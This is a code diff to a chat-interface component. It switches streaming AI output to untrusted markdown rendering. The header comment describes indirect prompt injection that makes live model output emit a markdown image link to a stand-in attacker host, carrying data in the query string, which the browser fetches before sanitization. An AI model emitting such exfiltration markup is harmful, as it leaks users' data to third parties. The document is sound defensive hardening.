@@ -4,8 +4,20 @@
 // composer, and canon rows stay still. The answer body is paced through `@orb/ui/stream
 // useSmoothText` (grapheme-safe, reduced-motion passthrough), passed through `repairStreamingTail`
 // (`@orb/kit/fix-markdown` — the #402/#473 streaming code-fence/torn-markup guard, UI-Gates §11.6)
-// while still streaming, then fed to `@orb/ui/markdown` as `trusted` (own AI output). Before the first
-// answer token (pending, or the first streaming frame) it shows the TTFT `StreamShimmer`.
+// while still streaming, then fed to `@orb/ui/markdown` as `untrusted`. Before the first answer token
+// (pending, or the first streaming frame) it shows the TTFT `StreamShimmer`.
+//
+// STREAM CONTENT IS UNTRUSTED (D44 §12.0 as corrected #25, UI-Gates §11.6). This is LIVE model output:
+// indirect prompt-injection can make it emit exfil-shaped markup, and the moment a paced reveal
+// completes an `![](https://attacker/?d=…)` mid-stream the browser fetches it BEFORE commit-time
+// sanitization ever runs. The settled canonical row already resolves trust per-message
+// (`resolveRowRenderPolicy`); the streaming ghost is the highest-exposure window and renders untrusted
+// (drops `<img>`/off-allowlist URLs, withholds Mermaid). Untrusted also drops the `<speaker>` custom-tag
+// passthrough (element + children), so a merged-narrator stream is pre-passed through
+// `speakerTagsToPlain` (`@orb/kit/speaker-label` — the sanctioned DISPLAY strip) to keep each speaker's
+// name visible as a plain `Name:` prefix while streaming; on settle the canonical row re-parses the
+// `<speaker>` markers for per-speaker coloring. A character that opted into trusted HTML still resolves
+// trusted on the settled row — this only fail-closes the live window.
 //
 // TASK #20 additions: the `<ReasoningBlock>` disclosure (rendered above the answer body, when there's
 // reasoning) owns its own "Thinking… Ns" → "Thought for Ns" TTFT affordance + the same repair guard for
@@ -31,6 +43,7 @@
 
 import { holdTornSpeaker } from "@orb/kit/fix-markdown";
 import type { CharacterId, ChatId } from "@orb/kit/ids";
+import { speakerTagsToPlain } from "@orb/kit/speaker-label";
 import { Row, Stack } from "@orb/ui/layout";
 import { Markdown } from "@orb/ui/markdown";
 import { StreamShimmer, useSmoothText } from "@orb/ui/stream";
@@ -117,7 +130,10 @@ export function GhostMessageRow({
   // markdown tail itself (unterminated fences / torn emphasis) — so the only pre-pass the seal still
   // needs is holding a TORN `<speaker>` tag (Streamdown does not). Applies only while streaming; once
   // settled the canonical row takes over via the separate settled pipeline.
-  const held = streaming ? holdTornSpeaker(paced) : paced;
+  // `speakerTagsToPlain` then converts any COMPLETE `<speaker>NAME</speaker>` marker to a plain `Name:`
+  // prefix — the untrusted seal (file header) drops the `<speaker>` element AND its name child, so
+  // without this a merged-narrator stream would lose every speaker name until settle.
+  const held = speakerTagsToPlain(streaming ? holdTornSpeaker(paced) : paced);
   const skin = MESSAGE_ROW_SKINS[chatStyle];
 
   // §B.2/gap-fix (b) — the SAME kind-aware resolution the settled row does (message-row.tsx), keyed
@@ -168,7 +184,7 @@ export function GhostMessageRow({
       {held.length === 0 ? (
         <StreamShimmer label="Generating a reply…" />
       ) : (
-        <Markdown trust="trusted" mode={streaming ? "streaming" : "static"}>
+        <Markdown trust="untrusted" mode={streaming ? "streaming" : "static"}>
           {held}
         </Markdown>
       )}
